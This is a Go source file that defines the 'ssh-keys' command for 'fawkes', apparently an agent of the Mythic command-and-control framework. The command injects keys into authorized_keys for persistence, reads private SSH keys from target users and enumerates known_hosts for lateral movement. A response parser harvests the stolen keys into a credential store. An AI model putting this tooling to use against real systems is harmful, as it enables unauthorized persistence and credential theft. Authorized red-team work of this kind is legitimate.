package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "ssh-keys",
		Description:         "Read or inject SSH authorized_keys for persistence/lateral movement (T1098.004)",
		HelpString:          "ssh-keys -action <list|add|remove|read-private|enumerate> [-key <ssh_public_key>] [-user <username>] [-path <file_path>]",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1098.004", "T1552.004"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"list", "add", "remove", "read-private", "enumerate"},
				Description:      "Action: list authorized_keys, add a key, remove a key, read private keys, or enumerate SSH config/known_hosts for lateral movement targets",
				DefaultValue:     "list",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "key",
				ModalDisplayName: "SSH Key",
				CLIName:          "key",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "SSH public key to add, or substring to match for removal",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "user",
				ModalDisplayName: "Target User",
				CLIName:          "user",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Target user (default: current user). Reads their ~/.ssh/ directory.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "path",
				ModalDisplayName: "File Path",
				CLIName:          "path",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Override default path (e.g., /root/.ssh/authorized_keys)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			if action != "read-private" {
				return response
			}
			// Extract SSH private keys from read-private output
			// Format: "=== /path/to/key ===\n-----BEGIN ... KEY-----\n...\n-----END ... KEY-----"
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			sections := strings.Split(responseText, "=== ")
			for _, section := range sections {
				if !strings.Contains(section, "PRIVATE KEY") {
					continue
				}
				lines := strings.SplitN(section, "\n", 2)
				keyPath := strings.TrimSuffix(strings.TrimSpace(lines[0]), " ===")
				if len(lines) < 2 {
					continue
				}
				keyContent := strings.TrimSpace(lines[1])
				if keyContent == "" {
					continue
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: "key",
					Realm:          hostname,
					Account:        keyPath,
					Credential:     keyContent,
					Comment:        "ssh-keys (read-private)",
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false,
				OpsecPreMessage:    "OPSEC WARNING: Reading SSH keys and authorized_keys files (T1098.004, T1552.004). SSH key file access is monitored by file integrity monitoring and EDR. Modifying authorized_keys is a persistence indicator.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := action
			user, _ := taskData.Args.GetStringArg("user")
			if user != "" {
				display += fmt.Sprintf(" (%s)", user)
			}
			response.DisplayParams = &display
			return response
		},
	})
}
